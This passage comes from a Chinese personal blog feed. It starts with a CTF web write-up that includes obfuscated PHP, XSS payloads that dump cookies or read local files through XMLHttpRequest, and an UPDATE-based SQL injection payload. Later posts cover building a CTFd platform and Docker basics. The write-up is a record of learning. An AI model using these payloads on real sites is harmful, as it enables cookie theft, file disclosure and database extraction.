class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; </span><br><span class="line"> </span><br><span class="line">$_=@$_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">$__=$_; </span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; </span><br><span class="line">$___ = $_; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___; </span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__= $__.$___.<span class="string">'_'</span>; </span><br><span class="line"></span><br><span class="line">$__ =$__.$__[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">$__ =$__.$__[<span class="number">2</span>];</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; </span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;</span><br><span class="line">$__ = $__.$___; </span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; </span><br><span class="line"> </span><br><span class="line">$_=@$_[<span class="number">3</span>];</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____ =<span class="string">''</span>;</span><br><span class="line">$____ = $____.$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____ = $____ .$___; </span><br><span class="line">$___ = $_;</span><br><span class="line">$____  = $____ .$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____ .$___.<span class="string">"."</span>;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____ .$___;</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line"></span><br><span class="line">$____  = $____.$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____.$___;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$__($____);</span><br></pre></td></tr></table></figure><p>我不知道这一题为什么加上了双引号就不行了,试了很多次都是invalid input ,这就很尴尬了..找不到原因,希望有大佬能找到原因告诉我一声啊!!!!</p><h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>这个题目根据题意我也看不出个啥，只是看这题目是xss看一下有没有cookie存在，直接一句<code>&lt;img src=1 onerror=document.write(document.cookie)&gt;</code>看一下有什么东西出现，结果就出现flag了，看了下官方wp是用input标签的，它的wp是这个样子的<code>&lt;input onfocus=&quot;document.write(document.cookie)&quot; autofocus&gt;</code>用的是onfoucus。。。又学到一个触发标签了，这里有解释这个标签:<a href="http://www.w3school.com.cn/jsref/event_onfocus.asp，简单说就是触发了对应的js代码，而它支持的各种标签在里面可以看得到。" target="_blank" rel="noopener">http://www.w3school.com.cn/jsref/event_onfocus.asp，简单说就是触发了对应的js代码，而它支持的各种标签在里面可以看得到。</a><br><a href="https://imgchr.com/i/PDRO74" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/05/PDRO74.md.png" alt="PDRO74.md.png"></a></p><h3 id="babyxss2"><a href="#babyxss2" class="headerlink" title="babyxss2"></a>babyxss2</h3><p>这个题目我一开始也不会做，没理解题目说的啥，看了官方wp </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"e"</span> <span class="attr">onerror</span>=<span class="string">"var x=new XMLHttpRequest();x.open('GET','file:///var/www/html/flag.php',false);x.send(null);document.write('&lt;textarea rows=10 cols=70&gt;'+x.responseText+'&lt;/textarea&gt;');"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现原来是用 <code>XMLHttpRequest()</code>去任意读取文件，是我太菜还没学到。。还得进步</p><h3 id="Sqli-update"><a href="#Sqli-update" class="headerlink" title="Sqli_update"></a>Sqli_update</h3><p>打开这个题目发现有注册功能，先注册一波看一下，发现就是个修改信息的东东，再扫一下看看一下有没有可疑文件<br>发现有源码，下载下来<br><a href="https://imgchr.com/i/PRPj1O" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPj1O.md.png" alt="PRPj1O.md.png"></a></p><p>发现这里面的代码执行SQL语句大部分都是这样子的，都已经预编译过了。SQL注入这个漏洞微乎其微</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $stmt=$mysqli-&gt;prepare(<span class="string">'select id,password from users where username=?'</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'s'</span>,$_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;store_result();</span><br></pre></td></tr></table></figure><p>突然在我翻到<code>update.php</code>这个页面的时候<br>发现了有点不妥<br><a href="https://imgchr.com/i/PRPvcD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPvcD.md.png" alt="PRPvcD.md.png"></a></p><p>这个经过了<code>addslashes</code>函数之后竟然在age这个参数里没加单引号，这是故意而为之？？？？<br>不管了，这是可以注入的，我以前的博客讲过 <a href="https://0verwatch.top/2018/08/02/sql-inject-protect/">https://0verwatch.top/2018/08/02/sql-inject-protect/</a><br><a href="https://imgchr.com/i/PRPxje" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPxje.md.png" alt="PRPxje.md.png"></a></p><p>然后登陆后立即试，bp抓包改一下age的值，然后查看源码得到flag<br><img src="https://s1.ax1x.com/2018/08/15/PRiSnH.png" alt="PRiSnH.png"><br>注意这里的a是别名的意思，其实省略了个<code>as</code><br>不然会报错的，自己可以在MySQL里面尝试一下</p><p>解决的方发就是起别名，这或许是mysql的特性吧<br><a href="https://blog.csdn.net/cao478208248/article/details/28122113" target="_blank" rel="noopener">https://blog.csdn.net/cao478208248/article/details/28122113</a></p><p>但是注意了我们这里不能直接上手把age里面的内容改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select description from users where username=0x61646d696e)</span><br></pre></td></tr></table></figure></p><p>会报错的<br><a href="https://imgchr.com/i/PRiPAI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRiPAI.md.png" alt="PRiPAI.md.png"></a><br>这是因为MySQL的原因,也就是同一个表的时候不能select完之后在同一个表直接update，而我们可以起个别名把他变成另外一个表即可，也就是上面的做法，以后在update注入的时候得注意如果是对同一个表进行操作的时候就得弄个新表了<br><a href="https://blog.csdn.net/priestmoon/article/details/8016121" target="_blank" rel="noopener">https://blog.csdn.net/priestmoon/article/details/8016121</a></p><p>Payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select description from(select * from users where username=0x61646d696e)a)</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>先记录着这么多先吧，明天再把剩下的题目完成，赶紧复习一波微机原理，不然明天的汇编又该看不懂了，最近事真多，Yii框架啥的还没写完，烦。。。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker练习及在CTFd平台上放题目</title>
      <link href="/2018/05/31/Docker-CTFd-building/"/>
      <url>/2018/05/31/Docker-CTFd-building/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章算是Docker学习还有CTFd平台搭建后的练习吧，毕竟都是用的dockerfile</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这里我复现的题目是SUSCTF 2018的题目，下面是github地址<br><a href="https://github.com/susers/Writeups/" target="_blank" rel="noopener">https://github.com/susers/Writeups/</a></p><p>这里我是利用了<code>dockerfile</code>去尝试把各个web题目复现一遍，深刻感受到docker的强大</p><p>总结一下我用的频率最多的是这两句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=镜像名字 .</span><br><span class="line">docker run --name=容器名字 -p 9999:22  -d 镜像名</span><br></pre></td></tr></table></figure><p>第一句话的.指的是当前目录下的<code>Dockfile</code>文件，每一个都执行一下<br>下图是我搭好的题目<br><img src="https://s1.ax1x.com/2018/05/31/CIaUHA.png" alt="CIaUHA.png"></p><p>然后就快乐地做题了，打开<code>192.168.1.103:4440</code>这里是虚拟机的地址,回显题目，成功<br><img src="https://s1.ax1x.com/2018/05/31/CIar38.png" alt="CIar38.png"></p><p>再来继续上一篇搭好CTFd平台的博客内容，来放题目，第一个创建的是管理员账号，然后点击右上角<code>Admin-&gt;Challenge</code> 一直添加即可，第一个是名字，这里是我其中一个题目的编辑状况，这个平台是可以用Markdown来编辑题目的，这就很舒服了23333<br><img src="https://s1.ax1x.com/2018/05/31/CIasgS.png" alt="CIasgS.png"></p><p>搭建好的效果图。。<br><img src="https://s1.ax1x.com/2018/05/31/CIayjg.png" alt="CIayjg.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这几天都在忙着练习怎么利用docker搭建环境，过几天就要考试了，很慌。。。。明天赶紧复习吧。。。</p>]]></content>
      
      <categories>
          
          <category> 环境部署 </category>
          
          <category> Web </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTFd平台搭建记录</title>
      <link href="/2018/05/31/CTFd-building/"/>
      <url>/2018/05/31/CTFd-building/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实这些内容在官方文档中都有，只是想在博客再记录一下，提高一下自己的熟悉程度<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTFd平台是在flask框架下写的，所以得先安装flask</p><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><h4 id="安装Flask"><a href="#安装Flask" class="headerlink" title="安装Flask"></a>安装Flask</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install Flask</span><br></pre></td></tr></table></figure><h4 id="下载-amp-安装-amp-运行CTFd"><a href="#下载-amp-安装-amp-运行CTFd" class="headerlink" title="下载&amp;安装&amp;运行CTFd"></a>下载&amp;安装&amp;运行CTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CTFd-1.0.5/</span><br><span class="line">sudo ./prepare.sh</span><br></pre></td></tr></table></figure><p>发现<code>Permission denied</code> 那就加权限给他呗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 prepare.sh</span><br></pre></td></tr></table></figure><p>再运行上面的命令即可</p><p>下面的命令是在本机执行的，如果想要外网访问，我们需要<code>gunicorn</code>这个东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python serve.py</span><br></pre></td></tr></table></figure><h4 id="安装gunicorn并运行CTFd"><a href="#安装gunicorn并运行CTFd" class="headerlink" title="安装gunicorn并运行CTFd"></a>安装<code>gunicorn</code>并运行CTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install gunicorn  </span><br><span class="line">sudo (gunicorn --<span class="built_in">bind</span> 0.0.0.0:8080 -w 1 <span class="string">"CTFd:create_app()"</span> &amp;)</span><br></pre></td></tr></table></figure><p>这里加了()还有&amp;是为了那能够后台运行<br>[0.0.0.0]不用修改<br>这里我映射的是8080端口，所用直接访问公网<code>ip:8080</code>即可访问<br><img src="https://s1.ax1x.com/2018/05/31/CIaVcF.png" alt="CIaVcF.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想在上面搭建一个OWASP的靶场的，后来发现怎么都import不上去那个挑战包，心很累，虽然说官方给出的是用1.0.5的版本，但是试过了还是安装不上。。。。下次直接尝试用Docker安装吧</p>]]></content>
      
      <categories>
          
          <category> 环境部署 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 环境部署 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker学习笔记</title>
      <link href="/2018/05/27/Docker-learning/"/>
      <url>/2018/05/27/Docker-learning/</url>
      <content type="html"><![CDATA[<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>一种虚拟化方案<br>操作系统级别的虚拟化<br>只能运行相同或相似内核的操作系统<br>依赖于Linux内核特性<br><a id="more"></a></p><h2 id="Docker基本组成"><a href="#Docker基本组成" class="headerlink" title="Docker基本组成"></a>Docker基本组成</h2><p><img src="https://s1.ax1x.com/2018/05/27/Ch0NM4.png" alt="Ch0NM4.png"></p><h3 id="Docker-Image-镜像"><a href="#Docker-Image-镜像" class="headerlink" title="Docker Image 镜像"></a>Docker Image 镜像</h3><p>容器的基石，一个层叠的文件系统</p><h3 id="Docker-Container容器"><a href="#Docker-Container容器" class="headerlink" title="Docker Container容器"></a>Docker Container容器</h3><p>通过镜像启动，就会产生一个可写层，这个可写层就是容器产生的内容。而另外下面的几个文件系统就是之前镜像提供的东西,这两样东西相结合就形成了容器。容器还有一个重要的内容就是写时复制(copy on write)</p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0UsJ.png" alt="Ch0UsJ.png"></p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0aL9.png" alt="Ch0aL9.png"></p><h3 id="Docker-Registry-仓库"><a href="#Docker-Registry-仓库" class="headerlink" title="Docker Registry 仓库"></a>Docker Registry 仓库</h3><p>公有 私有 Docker Hub</p><h3 id="Docker运用Linux的内核特性"><a href="#Docker运用Linux的内核特性" class="headerlink" title="Docker运用Linux的内核特性"></a>Docker运用Linux的内核特性</h3><p>Namespace 命名空间<br>Control groups（cgroups）控制组  —&gt;用来分配资源</p><p>Namespace<br>     对于编程而言，是一种封装=代码的隔离，对于操作系统而言是一种系统资源（进程，网络，文件系统）的隔离</p><h3 id="Ubantu中安装Docker"><a href="#Ubantu中安装Docker" class="headerlink" title="Ubantu中安装Docker"></a>Ubantu中安装Docker</h3><p>首先还是得检查<br>1.内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>2.检查Device Mapper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /sys/class/misc/device-mapper</span><br></pre></td></tr></table></figure><p>下面就是安装了<br>1.Ubuntu维护的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">  sudo apt-get install docker.io</span><br></pre></td></tr></table></figure><p>注意这里是<code>docker.io</code></p><p>2.Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新,以前那一种利用脚本安装的好像出了点问题   这部分有点烦人，按照官方文档去实现下载不太行，总是报错，最后就参考了一波下面这个网址的安装方法，终于装好，mmp，这里我用的是Ubuntu16.04 64位版本<br><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p><p> <code>sudo docker run hello-world</code> 检测一下是否安装好，安装好就会出现一定的回显</p><p>如果不想一直都要输入sudo,也就是当要以非root用户可以直接运行docker时，需要执行 <code>sudo usermod -aG docker</code> 你的用户名 命令，然后重新登陆，记得要<code>注销</code>，不然还是会报错</p><p>对比一下版本确实docker维护的版本较新，^_^<br><img src="https://s1.ax1x.com/2018/05/30/C5cTN4.png" alt="C5cTN4.png"><br><img src="https://s1.ax1x.com/2018/05/30/C5cbC9.png" alt="C5cbC9.png"></p><p>开启守护进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>对于Docker服务其他的相关命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>运行第一个容器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>如果想要其他版本的Linux的话把中间的Ubuntu改为centos即可，还可以改版本，例如<code>sudo docker run ubuntu:15.10 echo &quot;Hello world&quot;</code></p><h3 id="Windows下的安装"><a href="#Windows下的安装" class="headerlink" title="Windows下的安装"></a>Windows下的安装</h3><p>这是要下载专门的Docker for Windows这个东西上面的网址也有提及到，win10就专门利用的这个东西，但win7 还有 win8 的就用的是docker toolbox，Windows安装很容易出毛病，最典型的是如果你Win10上有虚拟机，开了Docker两者就会不兼容，因为Docker得开启win10自带的Hyper-V虚拟化，跟虚拟机会产生冲突，后续每次启动关闭都得重启，别问我为什么知道。。因为我都试过了。。-_-||</p><p>下面的过程我就默认直接是非root用户使用docker了</p><h3 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>在输出hello world之后镜像也就关闭了，无法交互<br>如果想要交互界面的话，看下面</p><h4 id="运行交互式的容器"><a href="#运行交互式的容器" class="headerlink" title="运行交互式的容器"></a>运行交互式的容器</h4><p>docker的两个参数 <code>-i -t</code>，让docker运行的容器实现<code>bash交互</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• -t:在新容器内指定一个伪终端或终端。</span><br><span class="line">• -i:允许你对容器内的标准输入 (STDIN) 进行交互</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>命令<code>exit</code>就可以退出交互式界面了，并且是<code>直接</code>把容器退出的</p><p>确认容器是否在运行，可以通过 <code>docker ps [-a] [-l]</code>查看，没有参数默认查看运行容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-a: all    可查看运行过的容器</span><br><span class="line">-l: latest</span><br></pre></td></tr></table></figure><h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><p>我们使用 <code>docker stop</code> 命令来停止容器:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID号</span><br></pre></td></tr></table></figure><p>停止之后记得<code>docker ps</code>一波查看是否真正关闭</p><p>自定义容器名字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name 自定义名 -i  -t IMAGE /bin/bash</span><br></pre></td></tr></table></figure><p>删除停止的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器名</span><br></pre></td></tr></table></figure><h4 id="重新启动停止的容器"><a href="#重新启动停止的容器" class="headerlink" title="重新启动停止的容器"></a>重新启动停止的容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start -i 容器名或ID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i参数指的是是否要交互界面</span><br></pre></td></tr></table></figure><p>查看某个容器更加详细的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器唯一ID或名字</span><br></pre></td></tr></table></figure><h3 id="启动容器-后台模式-守护式容器"><a href="#启动容器-后台模式-守护式容器" class="headerlink" title="启动容器(后台模式/守护式容器)"></a>启动容器(后台模式/守护式容器)</h3><p>一般用于开启服务，没有会话，长期运行<br>怎么理解这个东西，看下面</p><p>尝试下面的命令，然后docker ps发现该容器仍在后台执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/30/C52ySs.png" alt="C52ySs.png"><br>此时我们输入<code>docker logs 容器ID</code><br>会显示容器内的标准输出<br><img src="https://s1.ax1x.com/2018/05/30/C52wTS.png" alt="C52wTS.png"></p><p>一般的话我们在运行一个交互式的bash的时候</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i  -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>用的是 <code>ctrl+P</code>和 <code>ctrl+Q</code>键去退出这样就会在后台一直运行</p><p>要想回去怎么办？运用附加命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach 容器ID或者名字</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C5Rk0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/30/C5Rk0f.md.png" alt="C5Rk0f.md.png"></a></p><p>我们还可以直接用-d参数启动docker容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d ubuntu [COMMAND][ARG…]  也就是这部分一开头的例子</span><br></pre></td></tr></table></figure><p>这里再来详细讲下<code>docker logs</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs [-f][-t][--tail] 容器ID/名字</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f可以理解为是动态追踪</span><br><span class="line">-t是显示时间 还有其他参数可查看官方文档</span><br></pre></td></tr></table></figure><p>  一般我都是不带参数的。。。</p><h4 id="查看容器内的进程"><a href="#查看容器内的进程" class="headerlink" title="查看容器内的进程"></a>查看容器内的进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器ID/名字</span><br></pre></td></tr></table></figure><h4 id="在容器内执行新的进程"><a href="#在容器内执行新的进程" class="headerlink" title="在容器内执行新的进程"></a>在容器内执行新的进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [-d] [-i] [-t] 容器名 [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure><h4 id="停止守护式容器的方法"><a href="#停止守护式容器的方法" class="headerlink" title="停止守护式容器的方法"></a>停止守护式容器的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 docker stop 容器ID/名字    </span><br><span class="line">2 docker <span class="built_in">kill</span> 容器ID/名字</span><br></pre></td></tr></table></figure><p>区别在于第一种是等待容器内进程结束再关闭，另外一种是直接结束容器</p><p>想了解更多使用docker帮助文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> man命令</span><br><span class="line">如</span><br><span class="line">man docker-run</span><br><span class="line">man docker-top</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Docker中部署静态网页"><a href="#Docker中部署静态网页" class="headerlink" title="Docker中部署静态网页"></a>Docker中部署静态网页</h3><h4 id="设置容器的端口映射"><a href="#设置容器的端口映射" class="headerlink" title="设置容器的端口映射"></a>设置容器的端口映射</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run   [-P][-p]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-P: 对容器所有的端口进行映射</span><br><span class="line">-p: 指定映射哪些容器的端口</span><br></pre></td></tr></table></figure><p>下面是几个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">containerPort 只指定容器的端口，宿主机的端口随机映射</span><br><span class="line">docker run -p 80 -i  -t /bin/bash</span><br><span class="line">hostPort:ContainerPort 同时制定宿主机端口以及容器端口</span><br><span class="line"> docker run -p 8080:80 -i -t /bin/bash</span><br><span class="line"> ip:containerPort 指定ip和容器的端口</span><br><span class="line"> docker run -p 0.0.0.0:80 -i -t /bin/bash</span><br><span class="line"> ip:hostPort:ContainerPort 同时制定ip以及宿主机端口以及容器端口</span><br><span class="line"> docker run -p 0.0.0.0:8080:80 -i -t /bin/bash</span><br></pre></td></tr></table></figure><h4 id="Nginx部署流程"><a href="#Nginx部署流程" class="headerlink" title="Nginx部署流程"></a>Nginx部署流程</h4><p>先运行一个带端口映射的容器并命名为web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>然后安装Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y nginx</span><br></pre></td></tr></table></figure><p>安装Vim编辑器 ，主要是为了方便修改东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y vim</span><br></pre></td></tr></table></figure><p>新建一个工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /var/www/html</span><br></pre></td></tr></table></figure><p>切换到工作目录下,编辑一个静态页面</p><figure class="highlight bash"><table><tr><td 